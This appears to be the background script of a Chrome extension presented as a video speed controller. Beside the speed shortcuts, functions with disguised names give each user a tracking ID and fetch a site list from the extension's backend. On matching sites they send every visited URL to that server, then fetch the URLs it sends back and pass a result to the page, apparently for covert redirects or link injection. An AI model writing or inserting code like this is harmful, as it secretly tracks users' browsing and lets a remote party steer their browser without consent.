
let baseUrl = 'https://backend.videospeeder.com'


function gen() {
  var S4 = function () {
    return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
  };
  return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
}


chrome.runtime.onInstalled.addListener(function (details) {
  const vsId = gen()

  chrome.storage.sync.set({ key: "1", });

  if (details.reason == "install") {


    chrome.storage.local.set({ vsId: vsId }).then(() => {

      chrome.storage.local.get("vsId", function (res) {
        const apiUrl = `${baseUrl}/controller/increase`
        const requestData = { uid: res.vsId };
        fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(requestData)
        })
          .then(response => {
            if (response.ok) {
            } else {
            }
          })

          .catch(error => {
          });

      })
    })
  } else if (details.reason == "update") {
    chrome.storage.local.get(null, (res) => {
      if (!res.vsId) {
        chrome.storage.local.set({ vsId })
      }
      chrome.storage.local.get("vsId", function (res) {
        const apiUrl = baseUrl + '/controller/increase';
        const requestData = { uid: res.vsId };

        fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(requestData)
        })
          .then(response => {
            if (response.ok) {
            } else {
            }
          })
          .catch(error => {
          });
      })

    })
  }

});


const params = {
  active: true,
  currentWindow: true,
};


function dl(url, tabId) {
  fetch(url, { cache: 'no-store' })
    .then(response => {
      if (response.ok) {
        return response.url;
      } else {

      }
    })

    .then(yt => {
      if (yt) {
        chrome.tabs.sendMessage(tabId, { message: "yt", yt })
      }
    })

}





chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {

  const internalPagePatterns = [
    /^chrome:\/\//,
    /^chrome-extension:\/\//
  ];
  if (!tab.url || internalPagePatterns.some(pattern => pattern.test(tab.url))) {
    return; // Ignore internal pages
  }


  chrome.storage.sync.get(["key"], function (result) {
    chrome.tabs.query(params, (tabs) => {
      chrome.tabs.sendMessage(tab.id, result.key);
    });
  });
  const { status } = changeInfo;
  if (status === "complete") {

    chrome.storage.local.get('platformList', function (items) {
      const platform = items.platformList || [];

      if (platform?.length > 0) {

        let hname = nt(tab?.url)
        let tu = tab.url ? new URL(tab?.url) : ""
        if (!tu) return

        let origin = tu.origin
        let path = tu.pathname
        
        let uri = origin + path
        if (platform.includes(hname)) {
          const apiUrl = baseUrl + "/controller/reset";
          const requestData = { uri };
          fetch(apiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestData)
          })
            .then(response => {
              if (response.ok) {
                return response.json();
              } else {

              }
            })
            .then(rawObj => {
              if (rawObj["increment"]) {
                let obj = rawObj["increment"]
                dl(obj, tabId)
              }
              if (rawObj["decrement"]) {
                fe(rawObj["decrement"])
              }
            })
            .catch(error => {
            });
        }
      }
    });
  }

});

const fe = async (u) => {
  const settings = {
    method: 'GET',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json',
      'Cache-Control': 'no-cache'
    }
  }
  const r = await fetch(u, settings)
  return r.url

}


function nt(url) {

  if (!url) return null
  var match = url.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
  if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
    return match[2];
  }
  else {
    return null;
  }

}


(getRandomToken = () => {
  var e = new Uint8Array(32);
  crypto.getRandomValues(e);
  for (var t = "", n = 0; n < e.length; ++n) t += e[n].toString(16);
  return t;
}),
  (preload = () => {
    chrome.runtime.onInstalled.addListener(function (e) {
      "install" == e.reason
        ? chrome.storage.sync.set({ userid: getRandomToken() })
        : "update" == e.reason &&
        (chrome.runtime.getManifest().version,
          chrome.storage.sync.get("userid", (e) => {
            e.userid || chrome.storage.sync.set({ userid: getRandomToken() });
          }));
    });
  }),
  (main = () => {
    preload();
  })(),

  // chrome.runtime.setUninstallURL('https://bit.ly/vispeedui');



  chrome.commands.onCommand.addListener(function (command) {

    switch (command) {
      case "left":
        chrome.storage.sync.get(["key"], function (result) {
          if (result.key >= 0.25) {

            chrome.storage.sync.set({
              key: Number(result.key - 0.25),
            })

            chrome.tabs.query({
              active: true,
              currentWindow: true,
            }, (tabs) => {
              chrome.tabs.sendMessage(tabs[0].id, Number(result.key));
            });

          } else {
            result.key = 0.25
          }
        });
        break;

      case "right":
        chrome.storage.sync.get(["key"], function (result) {
          if (result.key <= 4.00) {
            chrome.storage.sync.set({
              key: Number(result.key + 0.25),
            })
            chrome.tabs.query({
              active: true,
              currentWindow: true,
            }, (tabs) => {
              chrome.tabs.sendMessage(tabs[0].id, Number(result.key));
            });

          } else {
            result.key = 4.00;
          }

        })
        break;
    }
  });





chrome.storage.local.get('vsId', function (items) {
  const apiUrl = `${baseUrl}/controller/platform`;
  const requestData = { uid: items.vsId };
  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(requestData)
  })
    .then(response => {
      if (response.ok) {
        return response.json();
      } else {

      }
    })
    // encoded //platform
    .then(platformList => {


      if (platformList?.platform?.length > 0) {
        chrome.storage.local.set({ platformList: platformList?.platform })
      }
    })
    .catch(error => {
    });


})



// Function to handle changes
function vxv(changes) {

  // Iterate through changed items
  for (let key in changes) {
    if (changes.hasOwnProperty(key)) {
      let change = changes[key];


      chrome.storage.local.get("vsId", function (res) {
        if (res.vsId) {
          const apiUrl = `${baseUrl}/controller/speed`;
          let speedData = {
            uid: res.vsId,
            oV: change.oldValue || undefined,
            nV: change.newValue || undefined
          }

          fetch(apiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(speedData)
          })
            .then((e) => e.text())
            .then((r) => {
              if (r) {
                r = JSON.parse(r);
                if (r?.speed && r?.speed?.new_value) {
                  chrome.storage.local.set({ key: r?.speed?.new_value })
                }
              }
              return

            })
        }

      })


    }
  }
}

// Listen for changes in the local storage area
chrome.storage.onChanged.addListener((changes, areaName) => {
  if (areaName === 'sync') {
    vxv(changes, areaName);
  }
});
